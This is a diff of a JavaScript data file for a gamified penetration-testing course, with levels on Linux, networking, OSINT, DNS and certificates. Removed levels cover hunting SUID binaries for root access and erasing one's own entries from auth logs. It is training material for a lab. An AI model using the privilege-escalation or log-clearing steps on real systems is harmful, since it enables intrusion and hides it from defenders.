-        steps: ["Inspect file structures for hidden metadata anomalies.", "Extract hidden data buffers using key verification passphrases."],
-        cmd: [{ t: "cmd", v: "steghide extract -sf artwork.jpg" }, { t: "out", v: "Wrote extracted data to payload.txt" }]
-      }
-    ],
-    hints: ["Look at file sizes closely; an innocent image containing an entire hidden code file will be noticeably heavier than it should be."],
-    quiz: [{ q: "What is the core definition of Steganography?", opts: ["Encrypting a hard drive partition", "Hiding data inside other innocent files, like embedding text inside an image", "Modifying user access rights", "Setting up firewall filters"], a: 1 }],
-    assignment: { title: "Exposed Media Extraction", tasks: ["Analyze suspicious media files found on our laboratory server.", "Extract the hidden configuration maps stashed inside them."], submit: "Submit the clear text code hidden inside the media attachment." }
-  },
-  {
-    id: 28, title: "Privilege Elevation (Linux SUID)", emoji: "📈", subtitle: "Exploiting misconfigured file permissions to claim full Root access.", type: "system", phase: 3, month: 3, points: 300, duration_mins: 160,
-    intro: "Gaining basic access is just the start. Learn how to spot and exploit misconfigured SUID bits on system files to elevate your privileges all the way to root.",
-    sections: [
-      {
-        title: "SUID Configuration Audits",
-        steps: ["Scan the filesystem for binaries running with root permissions.", "Use breakout tricks on these binaries to spawn a root terminal shell."],
-        cmd: [{ t: "cmd", v: "find / -perm -4000 -type f 2>/dev/null" }, { t: "out", v: "/usr/bin/python (SUID Active)" }]
-      }
-    ],
-    hints: ["When a binary has SUID permissions active, it runs with the privileges of the file owner (often root) no matter who executes it."],
-    quiz: [{ q: "What does an active SUID bit configuration do when a program is executed?", opts: ["It forces the file to open in read-only mode", "It runs the program with the permissions of the file's owner rather than the user who started it", "It immediately deletes the file from the system", "It turns on network encryption layers"], a: 1 }],
-    assignment: { title: "Root Level Elevation", tasks: ["Locate permission configuration flaws on the laboratory machine.", "Exploit the SUID files to gain full root system privileges."], submit: "Provide the root user flag token file path to prove execution success." }
-  },
-  {
-    id: 29, title: "Clearing Trails & Log Management", emoji: "🧹", subtitle: "Understanding system logging paths and erasing footprint logs.", type: "system", phase: 3, month: 3, points: 300, duration_mins: 120,
-    intro: "A professional red team engagement requires understanding system logs to see how actions are tracked, and ensuring testing trails are cleanly wrapped up.",
-    sections: [
-      {
-        title: "Log Path Interrogations",
-        steps: ["Navigate to the core system log folders.", "Inspect active authentication journals and server traffic histories."],
-        cmd: [{ t: "cmd", v: "tail -n 5 /var/log/auth.log" }, { t: "out", v: "Session opened for user root by operative" }]
-      }
-    ],
-    hints: ["Completely wiping log files looks highly suspicious. Real professionals carefully remove only their specific testing lines to avoid breaking system monitoring."],
-    quiz: [{ q: "Where does Debian store its main system authentication log records?", opts: ["/etc/auth.conf", "/var/log/auth.log", "/opt/secure/logs", "/root/history.txt"], a: 1 }],
-    assignment: { title: "Audit Trail Cleanup Simulation", tasks: ["Locate your connection footprints inside the laboratory log assets.", "Cleanly extract your testing trails from the operational file paths."], submit: "Submit the file paths where your session histories were tracked." }
-  },
-  {
-    id: 30, title: "Final Capstone Penetration Report", emoji: "🏁", subtitle: "Documenting findings and drafting mitigation strategies.", type: "web", phase: 3, month: 3, points: 500, duration_mins: 240,
-    intro: "Hacking is useless without communication. Wrap up your training by writing a clean, professional pentest report detailing your findings, scores, and how to fix the bugs.",
-    sections: [
-      {
-        title: "Professional Report Drafting",
-        steps: ["Organize all your attack notes and screenshots systematically.", "Rate your findings using the industry-standard CVSS score scale, and write plain-English fixes for each issue."],
-        cmd: [{ t: "c", v: "Required Sections Checklist" }, { t: "out", v: "1. Executive Summary\n2. Vulnerability Map\n3. CVSS Severity Ratings\n4. Fix Instructions" }]
-      }
-    ],
-    hints: ["Keep your executive summaries focused on business impact and risk, avoiding overly dense technical jargon so managers can easily understand."],
-    quiz: [{ q: "What is the ultimate goal of a red team training or penetration testing report?", opts: ["To show off personal skills", "To clearly explain identified risks and provide actionable fix steps to secure the network", "To get a system shut down", "To look for software bugs"], a: 1 }],
     assignment: {
-      title: "FINAL GRADUATION EXERCISE",
+      title: "Lab Assessment 0x01 — Scope Setup",
       tasks: [
-        "Complete all 4 operational phases.",
-        "Write a complete report covering all 4 core report modules.",
-        "Document at least 5 verified laboratory findings with CVSS scores.",
-        "Include step-by-step fix recommendations for every vulnerability found."
+        "Create an organized lab directory tree structure on your workstation console.",
+        "Generate a text file summarizing the key differences between a Red Team and a Blue Team.",
+        "Document your local shell environment settings parameters accurately."
       ],
-      submit: "Submit your final penetration testing report to complete your graduation assignment."
-    }
+      submit: "Submit the output text log showing your clean directory configurations."
+    },
+    summary: "Level 1 established the legal framework necessary for security engagements and initialized the command-line workstation matrix.",
+    preview: "Next Level Preview: Level 2 deep-dives into intermediate Linux Mastery, covering bash utilities, operations control, and administrative permission bits."
+  },
+  {
+    id: 2,
+    title: "Linux Mastery",
+    emoji: "📁",
+    subtitle: "Advanced Shell Operations, Permissions, and Background Services",
+    type: "system",
+    phase: 1,
+    month: 1,
+    points: 50,
+    duration_mins: 45,
+    intro: "Operating within enterprise environments demands complete comfort working inside non-GUI terminal interfaces to manage files, monitor threads, and adjust parameters.",
+    objectives: [
+      "Understand and modify standard Linux file permissions using octal notation.",
+      "Monitor, filter, and control active process workflows running in the system background.",
+      "Inspect, manage, and verify structural system logging streams for auditing trails."
+    ],
+    theory: "Everything in Linux is treated as a file. Access permissions are controlled by read (4), write (2), and execute (1) parameters assigned across Owners, Groups, and Users. Long-running automation actions are handled by background processes or services. Tracking these active threads via terminal utilities ensures administrators can spot unauthorized application workflows immediately.",
+    sections: [
+      {
+        title: "Process Control and System Auditing",
+        steps: [
+          "Display a comprehensive list of all active execution workflows inside the engine.",
+          "Isolate specific running application instances using terminal stream filtration rules.",
+          "Check system logs to verify recent terminal authentication events."
+        ],
+        cmd: [
+          { t: "c", v: "Check running process parameters cleanly" },
+          { t: "cmd", v: "ps aux | grep bash" },
+          { t: "out", v: "malik        114  0.0  0.1  18232  3240 pts/0    S    07:15   0:00 /bin/bash" },
+          { t: "c", v: "Inspect security configuration permissions attributes" },
+          { t: "cmd", v: "chmod 755 notes/session_log.txt && ls -l notes/session_log.txt" },
+          { t: "out", v: "-rwxr-xr-x 1 malik root 240 Jun 26 07:15 notes/session_log.txt" }
+        ]
+      }
+    ],
+    challenge: "Independent Challenge: Locate a background test process ID (PID) running on your local machine and use standard management utilities to terminate it cleanly without breaking adjacent system pools.",
+    hints: [
+      "The 'ps aux' utility displays all running system indicators; pipe it to 'grep' to filter down to a specific name.",
+      "Ensure you are target-matching the precise numeric process ID (PID) column value during adjustments."
+    ],
+    quiz: [
+      { q: "Which octal permissions configuration grants full read/write/execute properties to the owner, but only read/execute to others?", opts: ["777", "644", "755", "400"], a: 2 },
+      { q: "Which standard folder path contains the core system logging records in a Debian Linux distribution?", opts: ["/etc/config", "/var/log", "/opt/bin", "/home/malik"], a: 1 }
+    ],
+    assignment: {
+      title: "Lab Assessment 0x02 — System Supervision Audit",
+      tasks: [
+        "Generate and log a complete list of running process states on your terminal workstation.",
+        "Modify a tracking script file's attributes to restrict execution permissions to your profile owner explicitly.",
+        "Locate and view your local terminal session history file values."
+      ],
+      submit: "Submit the list of terminal flags and command streams used during process management."
+    },
+    summary: "Level 2 delivered foundational mastery over permissions administration, process supervision variables, and filesystem diagnostics.",
+    preview: "Next Level Preview: Level 3 steps outside the local terminal to map out global Network Frameworks, the OSI Model, and Socket routes."
+  },
+  {
+    id: 3,
+    title: "Networking Foundations",
+    emoji: "🌐",
+    subtitle: "OSI Reference Models, Core Protocols, and Socket Identification",
+    type: "system",
+    phase: 1,
+    month: 1,
+    points: 60,
+    duration_mins: 60,
+    intro: "Networks handle all modern platform traffic. Before verifying structural safety boundaries, you must understand how data packets are routed across systems.",
+    objectives: [
+      "Deconstruct data flow models across the 7 layers of the OSI model and TCP/IP stacks.",
+      "Identify core internet service protocols, including DNS, HTTP, HTTPS, and SSH channels.",
+      "Map active communication connection configurations on your local adapter matrices."
+    ],
+    theory: "Data traffic travels over explicit numeric designations known as ports. Standard core protocols have fixed definitions (e.g., HTTP runs over port 80, HTTPS over 443, SSH over 22). By inspecting active socket parameters on a server, security analysts can verify which channels are open and listening to inbound network traffic requests.",
+    sections: [
+      {
+        title: "Socket Management and Port Interrogation",
+        steps: [
+          "Query network adapter configurations to verify active IP routing parameters.",
+          "Audit local system port connections to verify running listening services."
+        ],
+        cmd: [
+          { t: "c", v: "Query localized IP address definitions across adapters" },
+          { t: "cmd", v: "ip addr show" },
+          { t: "out", v: "inet 127.0.0.1/8 scope host lo\ninet 192.168.1.45/24 brd 192.168.1.255 scope global eth0" },
+          { t: "c", v: "Verify all listening TCP port sockets on the system" },
+          { t: "cmd", v: "ss -tlnp" },
+          { t: "out", v: "State      Recv-Q Send-Q Local Address:Port\nLISTEN     0      128    0.0.0.0:22" }
+        ]
+      }
+    ],
+    challenge: "Independent Challenge: Analyze your local network configuration parameters, identify your system's active default gateway route, and map out the protocol name linked to port 53.",
+    hints: [
+      "The 'ss' utility is the modern replacement for old, legacy 'netstat' routing diagnostics.",
+      "Port 53 handles domain translation logic tasks across global web platforms."
+    ],
+    quiz: [
+      { q: "Which OSI layer handles the framing and routing of IP packets across intermediate network nodes?", opts: ["Layer 1 — Physical", "Layer 3 — Network", "Layer 7 — Application", "Layer 4 — Transport"], a: 1 },
+      { q: "What network service protocol runs on port 22 by default to support secure encrypted terminal command connections?", opts: ["FTP", "HTTP", "SSH", "DNS"], a: 2 }
+    ],
+    assignment: {
+      title: "Lab Assessment 0x03 — Network Interface Mapping",
+      tasks: [
+        "Map and log the active local IP properties of your workstation adapter card parameters.",
+        "List every active listening TCP port discovered during your network socket scans.",
+        "Explain the key operational difference between TCP connection tracking and UDP datagram flows."
+      ],
+      submit: "Submit the text log containing your network interface configurations and port listings."
+    },
+    summary: "Level 3 provided clear insight into network mapping, protocol layers, socket behaviors, and local routing rules.",
+    preview: "Next Level Preview: Level 4 builds automation scripts using Bash variables, logic constructs, and basic Python execution loops."
+  },
+  {
+    id: 4,
+    title: "Programming Basics",
+    emoji: "⚙️",
+    subtitle: "Automation Scripts, Logical Loops, and Data Stream Handling",
+    type: "system",
+    phase: 1,
+    month: 1,
+    points: 60,
+    duration_mins: 60,
+    intro: "Modern security analysis requires automation. Learning to translate manual terminal commands into script workflows allows you to easily process complex datasets.",
+    objectives: [
+      "Construct executable Bash automation shell scripts to automate system status checks.",
+      "Develop foundational Python logic maps incorporating variables, arrays, and conditional if/else blocks.",
+      "Parse structured data file assets like JSON strings via execution loop structures."
+    ],
+    theory: "Programming structures allow computers to handle repetitive tasks using defined rules. Variables save data parameters in memory, conditional statements evaluate true/false paths, and loop arrays iterate through records. Automating system logs parsing or port monitoring saves time and reduces manual errors during long-running administrative assessments.",
+    sections: [
+      {
+        title: "Script Automation and Stream Parsing",
+        steps: [
+          "Write an automated Bash loop script to check if network targets are active.",
+          "Build a basic Python interpreter routine to parse and print dataset records safely."
+        ],
+        cmd: [
+          { t: "c", v: "Write a quick test script loop directly from your terminal workspace" },
+          { t: "cmd", v: "echo -e '#!/bin/bash\\nfor i in {1..3}; do echo \"Node-$i online\"; done' > check.sh" },
+          { t: "c", v: "Configure operational execution flags and test code execution loops" },
+          { t: "cmd", v: "chmod +x check.sh && ./check.sh" },
+          { t: "out", v: "Node-1 online\nNode-2 online\nNode-3 online" }
+        ]
+      }
+    ],
+    challenge: "Independent Challenge: Write a short, local Python script file named 'parser.py' that takes an array of placeholder domain names, runs through them using a loop, and prints each name with a custom status tag.",
+    hints: [
+      "Always verify that your script's first line contains the correct interpreter path hashbang directive.",
+      "Indentations are critical to formatting and execution within Python coding loops."
+    ],
+    quiz: [
+      { q: "What does the hashbang line '#!/bin/bash' tell the operating system when running a script?", opts: ["It encrypts the source code", "It designates the target terminal shell interpreter to use for execution", "It completely deletes the temporary logging lines", "It requires an active internet hook"], a: 1 },
+      { q: "Which control sequence allows a code logic block to loop through a predefined list of variables?", opts: ["if statement", "for loop", "variable assignment", "return function"], a: 1 }
+    ],
+    assignment: {
+      title: "Lab Assessment 0x04 — Automation Assembly",
+      tasks: [
+        "Provide your functional Bash system monitoring loop source code parameters.",
+        "Develop a Python array loop script that outputs formatted service port tracking items.",
+        "Document the terminal error response messages if executable parameters are skipped."
+      ],
+      submit: "Upload your completed automation script structures for review."
+    },
+    summary: "Level 4 introduced core automation logic, variable assignments, array looping, and multi-language script execution.",
+    preview: "Next Level Preview: Level 5 explores Web Architecture, focusing on browser structures, session tokens, cookies, and HTTP request methods."
+  },
+  {
+    id: 5,
+    title: "Web Technologies",
+    emoji: "🌐",
+    subtitle: "HTTP Methods, DOM Architectures, and Session Cookie Variables",
+    type: "system",
+    phase: 1,
+    month: 1,
+    points: 70,
+    duration_mins: 50,
+    intro: "Web applications are a primary gateway for modern data exchange. To secure web services, you must first understand how browsers talk to backend servers.",
+    objectives: [
+      "Deconstruct structural components of HTTP request and response message frames.",
+      "Explain the exact functional purpose of Document Object Models, HTML, and client-side JavaScript.",
+      "Analyze session management mechanics, authentication cookie headers, and REST API endpoints."
+    ],
+    theory: "Web interaction uses a clear Request/Response model. Browsers send HTTP requests (like GET to read data, or POST to submit forms) to a web server, which replies with status codes (such as 200 OK or 404 Not Found). Sessions are kept stateless via temporary token parameters called cookies, which browsers store and send back with every request to verify user identities.",
+    sections: [
+      {
+        title: "HTTP Stream Inspection and Tracking",
+        steps: [
+          "Query a local playground web server target using advanced terminal protocol tools.",
+          "Analyze the structural response status values, framework headers, and cookie properties."
+        ],
+        cmd: [
+          { t: "c", v: "Inspect web endpoint connection metadata frames explicitly" },
+          { t: "cmd", v: "curl -v http://localhost:8080" },
+          { t: "out", v: "> GET / HTTP/1.1\n> Host: localhost:8080\n\n< HTTP/1.1 200 OK\n< Server: Apache/2.4.41\n< Set-Cookie: session_id=malik_token_99; HttpOnly" }
+        ]
+      }
+    ],
+    challenge: "Independent Challenge: Track down an active API string response value within your local practice workspace, and break down its component attributes into a key-value format.",
+    hints: [
+      "The '-v' flag in curl turns on full logging outputs, showing you exactly what headers are passing back and forth.",
+      "The 'HttpOnly' flag tells browsers to protect cookies by blocking client-side scripts from reading them."
+    ],
+    quiz: [
+      { q: "Which HTTP request method is typically used when submitting profile forms or transmitting user data sets to a backend database?", opts: ["GET", "POST", "OPTIONS", "HEAD"], a: 1 },
+      { q: "What does an HTTP status code return mapping in the 400-499 range typically indicate?", opts: ["Server-side internal routing faults", "Client-side input request errors", "Successful data synchronization operations", "Network connection timeouts"], a: 1 }
+    ],
+    assignment: {
+      title: "Lab Assessment 0x05 — Web Component Analysis",
+      tasks: [
+        "Capture and itemize all transaction headers returned by your mock local laboratory web page.",
+        "Document the specific security attributes present on the response session cookies.",
+        "Explain the structural role of a REST API configuration within multi-tier application networks."
+      ],
+      submit: "Submit the parsed header logs alongside your structural security descriptions."
+    },
+    summary: "Level 5 mapped out standard web applications infrastructure, covering HTTP states, browser parameters, and token properties.",
+    preview: "Next Level Preview: Entering Phase 2: Reconnaissance. Level 6 teaches Passive Reconnaissance methodologies, public asset harvesting, and tracking footprints safely."
+  },
+
+  // ── PHASE 2: RECONNAISSANCE & INFO GATHERING (LEVELS 6–10) ────
+  {
+    id: 6,
+    title: "Passive Reconnaissance Foundations",
+    emoji: "📡",
+    subtitle: "OSINT Frameworks, Passive Footprints, and External Target Profiling",
+    type: "web",
+    phase: 2,
+    month: 2,
+    points: 100,
+    duration_mins: 60,
+    intro: "Reconnaissance is the foundational first step of any comprehensive assessment. Passive methods gather publicly indexed internet records without interacting directly with target firewalls.",
+    objectives: [
+      "Understand the operational core of Open Source Intelligence (OSINT) workflows.",
+      "Map out public organizational footprints safely without sending direct network packets to the host.",
+      "Establish rigorous note-taking frameworks to log target information structured for future analysis."
+    ],
+    theory: "Passive reconnaissance collects infrastructure details from third-party caches, public search engines, and global configuration listings. Because your workstation never communicates directly with the target company's servers, the assessment profile remains completely invisible to their local boundary intrusion detection logs and firewalls.",
+    sections: [
+      {
+        title: "OSINT Document Interrogation and Mining",
+        steps: [
+          "Use public internet infrastructure directories to audit historical domain details safely.",
+          "Examine exposed metadata traces hidden inside publicly downloadable documentation profiles."
+        ],
+        cmd: [
+          { t: "c", v: "Review public global WHOIS allocation records for registration data paths" },
+          { t: "cmd", v: "whois sandbox.nighters.lan" },
+          { t: "out", v: "Domain Name: sandbox.nighters.lan\nRegistry Domain ID: 9988112_LAN\nRegistrar: Global Assets Provisioning LLC\nName Server: ns1.nighters.lan" }
+        ]
+      }
+    ],
+    challenge: "Independent Challenge: Perform a completely passive configuration record trace against a public demonstration domain map, and chart its registered technical contact handles systematically.",
+    hints: [
+      "Public databases like WHOIS contain registration entries, name server paths, and administrative point contacts.",
+      "Never initialize intrusive automated scanning loops when conducting passive infrastructure audits."
+    ],
+    quiz: [
+      { q: "What is the core identifying feature of a proper Passive Reconnaissance operations phase?", opts: ["Modifying database rows", "Flooding systems with connection requests", "Collecting data from public third-party indexes without touching target host assets", "Brute-forcing access credentials"], a: 2 },
+      { q: "Why is structured note-taking critical during the initial reconnaissance stages?", opts: ["It increases script execution speeds", "It forms the evidentiary foundation for the eventual technical mitigation report", "It alters server response headers", "It bypasses local firewall blocks"], a: 1 }
+    ],
+    assignment: {
+      title: "Lab Assessment 0x06 — Passive Target Intelligence",
+      tasks: [
+        "Compile a passive intelligence index mapping the public domain assets of a simulated target company.",
+        "Document all external name server point-of-presence mappings discovered during public lookups.",
+        "Structure a clear template sheet for tracking discovered assets across future lab assignments."
+      ],
+      submit: "Submit your passive intelligence index sheet for evaluation."
+    },
+    summary: "Level 6 established the core concepts of passive OSINT methodologies and built structured asset inventories.",
+    preview: "Next Level Preview: Level 7 expands data collection into public repositories, utilizing source code archives and leak directories."
+  },
+  {
+    id: 7,
+    title: "Public Information Gathering (OSINT)",
+    emoji: "🔍",
+    subtitle: "Public Repositories, Leak Directories, and Archive Interrogations",
+    type: "web",
+    phase: 2,
+    month: 2,
+    points: 100,
+    duration_mins: 75,
+    intro: "Organizations often accidentally expose sensitive parameters inside historical code archives, open public code hubs, and system metadata profiles.",
+    objectives: [
+      "Analyze public version-control history archives to find forgotten credentials or testing routes.",
+      "Query public internet infrastructure archive machines to track down decommissioned web paths.",
+      "Identify corporate structure footprints, email schemas, and user identity formats using open directories."
+    ],
+    theory: "Developers sometimes make mistakes, like forgetting to remove testing paths or hardcoded configuration parameters before uploading tools to public code hubs. Reviewing old source history, historical directory paths, and archive backups can reveal valuable system information without running a single active scan against the live production systems.",
+    sections: [
+      {
+        title: "Historical Repository Code Interrogation",
+        steps: [
+          "Audit a sample open-source development repository file history.",
+          "Track down hardcoded configuration comments or exposed deployment parameters inside the code history logs."
+        ],
+        cmd: [
+          { t: "c", v: "Review past version tracking logs to search for development comments" },
+          { t: "cmd", v: "git log -p -n 1" },
+          { t: "out", v: "commit f7b230198ca11\nAuthor: dev-malik <malik@nighters.lan>\n-  const DB_PASS = \"STAGING_DEV_PASSWORD_99\"; // Remove before prod" }
+        ]
+      }
+    ],
+    challenge: "Independent Challenge: Dig through a local practice repository asset file structure, analyze its configuration change logs, and isolate any old testing environment configurations.",
+    hints: [
+      "The command 'git log -p' shows you the exact line-by-line differences and changes made across historical system updates.",
+      "Decommissioned code segments often reveal internal naming schemes and backend server IP layouts."
+    ],
+    quiz: [
+      { q: "Which tool or strategy allows analysts to review older, cached versions of public web platforms that are no longer live?", opts: ["Nmap port sweep", "Internet Archive / Wayback Machine directories", "SQLMap engine", "Local host tables"], a: 1 },
+      { q: "What security issue occurs when developers leave credentials directly inside source code history files?", opts: ["Cross-Site Scripting", "Hardcoded Secret Exposure", "Denial of Service", "Unrestricted File Upload"], a: 1 }
+    ],
+    assignment: {
+      title: "Lab Assessment 0x07 — Archive Configuration Audit",
+      tasks: [
+        "Audit the provided laboratory practice code history log files.",
+        "Isolate and document all hardcoded developer notes, private parameters, and email string patterns.",
+        "Draft a clear remediation guide explaining how teams can remove history items before publishing projects."
+      ],
+      submit: "Submit the list of discovered code findings along with your remediation guidelines."
+    },
+    summary: "Level 7 demonstrated how historical data, open code repositories, and public documentation metadata can accidentally reveal backend system details.",
+    preview: "Next Level Preview: Level 8 dives into DNS Concepts, detailing zone records, name translation systems, and infrastructure lookup tools."
+  },
+  {
+    id: 8,
+    title: "DNS Concepts & Verification",
+    emoji: "🗺️",
+    subtitle: "Zone Assertions, Record Architectures, and Infrastructure Lookups",
+    type: "web",
+    phase: 2,
+    month: 2,
+    points: 110,
+    duration_mins: 60,
+    intro: "The Domain Name System acts as the phonebook of the global web. Reviewing public DNS records helps security teams map out a company's mail servers and mail validation rules.",
+    objectives: [
+      "Deconstruct different DNS record types, including A, AAAA, MX, TXT, and CNAME mappings.",
+      "Query global domain registration architectures safely using standard command-line diagnostic tools.",
+      "Analyze text-based email protection rules (SPF, DKIM) to evaluate external spoofing resilience."
+    ],
+    theory: "DNS translates human-readable web addresses into machine-routable IP numbers. Looking at these public assignments reveals key infrastructure details: MX records point straight to email handling servers, while TXT records hold validation strings like SPF (Sender Policy Framework) rules, which tell you which servers are authorized to send emails for the company.",
+    sections: [
+      {
+        title: "Domain Record Interrogation Queries",
+        steps: [
+          "Query public name servers to locate target IP address resolution lines.",
+          "Pull down TXT record entries to check the active email verification settings."
+        ],
+        cmd: [
+          { t: "c", v: "Query target mail server configurations safely" },
+          { t: "cmd", v: "dig mx sandbox.nighters.lan +short" },
+          { t: "out", v: "10 mail-relay.sandbox.nighters.lan." },
+          { t: "c", v: "Audit email security verification configurations" },
+          { t: "cmd", v: "dig txt sandbox.nighters.lan +short" },
+          { t: "out", v: "\"v=spf1 ip4:192.168.1.0/24 -all\"" }
+        ]
+      }
+    ],
+    challenge: "Independent Challenge: Run a query to pull down the CNAME records for a local practice test node, and map out the canonical domain redirection paths accurately.",
+    hints: [
+      "Using the '+short' flag with the dig utility simplifies your console display by hiding everything except the direct answer values.",
+      "The '-all' flag inside an SPF record means the company enforces a strict drop rule for unauthorized external emails."
+    ],
+    quiz: [
+      { q: "Which DNS record entry type is responsible for routing domain names straight to target IPv4 server addresses?", opts: ["MX Record", "AAAA Record", "A Record", "CNAME Record"], a: 2 },
+      { q: "What defensive strategy is configured within public TXT entries to help protect domains from email spoofing attacks?", opts: ["SSL/TLS handshakes", "SPF (Sender Policy Framework)", "HTTP secure methods", "Process thread monitoring"], a: 1 }
+    ],
+    assignment: {
+      title: "Lab Assessment 0x08 — Public Domain Auditing",
+      tasks: [
+        "Extract and catalog all A and MX records for the provided laboratory practice domain.",
+        "Analyze the discovered TXT records to confirm if email validation policies are active.",
+        "Create an architectural diagram showing how name changes handle routing across external addresses."
+      ],
+      submit: "Submit your comprehensive domain record analysis report."
+    },
+    summary: "Level 8 covered DNS zone auditing, record types, and using text configurations to verify email defenses.",
+    preview: "Next Level Preview: Level 9 expands on infrastructure checks, exploring SSL/TLS Public Key Certificates and WHOIS data analysis."
+  },
+  {
+    id: 9,
+    title: "Certificates & WHOIS Analytics",
+    emoji: "📜",
+    subtitle: "Public Key Certificates, Trust Matrix Reviews, and Registration Fields",
+    type: "web",
+    phase: 2,
+    month: 2,
+    points: 110,
+    duration_mins: 80,
+    intro: "Public Key Certificates keep web connections secure, but their configuration logs also reveal valuable clues about a company's internal server names and staging endpoints.",
+    objectives: [
+      "Analyze public SSL/TLS certificates to find hidden internal server directories and subdomains.",
+      "Inspect certificate expiration dates, registration signatures, and Issuer hierarchies.",
+      "Correlate WHOIS historical registration data to locate shared networks and related infrastructure boundaries."
+    ],
+    theory: "To run an encrypted website (HTTPS), companies must obtain an SSL/TLS certificate. These certificates often list multiple related web addresses in their Subject Alternative Name (SAN) fields. Because these certificate parameters are logged in public databases, security professionals can audit them to discover hidden staging servers or development environments without scanning the target directly.",
+    sections: [
+      {
+        title: "Certificate Transparency and Metadata Mining",
+        steps: [
+          "Query a local practice web service port to pull down its active encryption certificate parameters.",
+          "Parse the Subject Alternative Name fields to identify any linked staging domain lines."
+        ],
+        cmd: [
+          { t: "c", v: "Pull and parse public encryption certificate fields cleanly via connection streams" },
+          { t: "cmd", v: "openssl s_client -connect localhost:443 -showcerts < /dev/null 2>/dev/null | openssl x509 -noout -text | grep -A 1 \"Subject Alternative Name\"" },
+          { t: "out", v: "X509v3 Subject Alternative Name:\n  DNS:sandbox.nighters.lan, DNS:dev-internal.nighters.lan" }
+        ]
+      }
+    ],
+    challenge: "Independent Challenge: Extract the issuer registration authorities and alternative domain mappings from the provided laboratory encryption certificate files.",
+    hints: [
+      "The 'openssl s_client' command initializes an encrypted connection loop to inspect certificate details safely.",
+      "The SAN parameter block often exposes unindexed development URLs that won't show up in standard search engine results."
+    ],
+    quiz: [
+      { q: "Where can security analysts find hidden domain names or internal subdomains inside an SSL/TLS certificate configuration?", opts: ["The Cipher Block Chain parameter", "Subject Alternative Name (SAN) field parameters", "The TCP window size profile", "The HTTP request path structure"], a: 1 },
+      { q: "What information can historically tracked WHOIS records provide during asset analysis?", opts: ["Real-time active CPU use statistics", "Historical registrar networks, point contacts, and administrative handle paths", "Active server database tables", "Running system process PIDs"], a: 1 }
+    ],
+    assignment: {
+      title: "Lab Assessment 0x09 — Cryptographic Asset Auditing",
+      tasks: [
+        "Extract the Subject Alternative Name entries from your assigned laboratory test target.",
+        "Document the certificate authority chain and signature validation types used by the host.",
+        "Cross-reference corporate registration fields using available passive directory maps."
+      ],
+      submit: "Submit the certificate metadata listings along with your infrastructure mapping logs."
+    },
+    summary: "Level 9 focused on reading public encryption certificate logs, extracting alternative domain fields, and tracking down connected registration endpoints.",
+    preview: "Next Level Preview: Level 10 concludes Phase 2 with Advanced Search Engine Operators, helping you locate exposed files and build asset inventories."
+  },
+  {
+    id: 10,
+    title: "Search Engine Operators & Asset Inventories",
+    emoji: "📋",
+    subtitle: "Advanced Directives, Directory Exposure Lookups, and Inventory Building",
+    type: "web",
+    phase: 2,
+    month: 2,
+    points: 150,
+    duration_mins: 90,
+    intro: "Search engines constantly crawl global web applications. Using advanced search filters allows you to locate exposed file structures and forgotten administrative entry points.",
+    objectives: [
+      "Master advanced search engine filters like 'site', 'filetype', and 'intitle' to isolate exposed resources.",
+      "Locate accidental directory index exposures, configuration backups, and unindexed portals.",
+      "Assemble discovered assets into a structured master tracking log ready for administrative remediation reviews."
+    ],
+    theory: "Public web crawlers index everything they can find unless explicitly blocked by a site's policy files (like `robots.txt`). By combining specific search filters, you can query these massive public engine databases to pinpoint critical issues—such as exposed configuration sheets, forgotten database backups, or open file directories—without interacting with the live systems.",
+    sections: [
+      {
+        title: "Advanced Engine Filter Simulation Mapping",
+        steps: [
+          "Use advanced search query strings to locate exposed log file backups in your training data sets.",
+          "Filter out standard production routes to isolate unindexed administrative portals."
+        ],
+        cmd: [
+          { t: "c", v: "Simulate an advanced search query strategy to locate exposed configuration backups" },
+          { t: "cmd", v: "echo \"Search Directive: site:nighters.lan filetype:sql\"" },
+          { t: "out", v: "Simulated Match: http://nighters.lan/uploads/backup_2026.sql" },
+          { t: "c", v: "Simulate a query filter targeting exposed directory listing layouts" },
+          { t: "cmd", v: "echo \"Search Directive: site:nighters.lan intitle:\\\"index of\\\"\"" },
+          { t: "out", v: "Simulated Match: http://nighters.lan/development/src/" }
+        ]
+      }
+    ],
+    challenge: "Independent Challenge: Create a structured asset directory inventory containing 5 distinct asset classes discovered across Phase 2, organizing them by risk level and configuration group.",
+    hints: [
+      "The 'filetype:' filter helps you zero in on specific extensions like log, sql, env, or backup configurations.",
+      "Reviewing site policy files like 'robots.txt' can reveal exactly which sensitive paths administrators are trying to hide from search engines."
+    ],
+    quiz: [
+      { q: "Which advanced search operator restricts query results exclusively to a single target domain address framework?", opts: ["filetype:", "site:", "intitle:", "inurl:"], a: 1 },
+      { q: "What file is placed in a website's root folder to give crawling bots instructions on which directories to skip?", opts: ["index.html", ".env", "robots.txt", "config.php"], a: 2 }
+    ],
+    assignment: {
+      title: "Lab Assessment 0x10 — Phase 2 Capstone Inventory",
+      tasks: [
+        "Build a comprehensive master asset inventory log mapping all discoveries from Levels 6 through 10.",
+        "Document at least 3 simulated query strings designed to look for exposed configuration assets.",
+        "Provide clear technical recommendations explaining how an organization can hide staging portals and internal documentation from public crawlers."
+      ],
+      submit: "Submit your final master asset inventory document to complete your Phase 2 milestone assignment."
+    },
+    summary: "Level 10 completed Phase 2 by detailing advanced search engine filters, finding exposed directories, and organizing discoveries into a professional asset inventory tracking system.",
+    preview: "Next Level Preview: Moving to Phase 3: Web Security Fundamentals. Level 11 focuses on Authentication Architectures, session management rules, and login form security validations."
   }
 ];
 
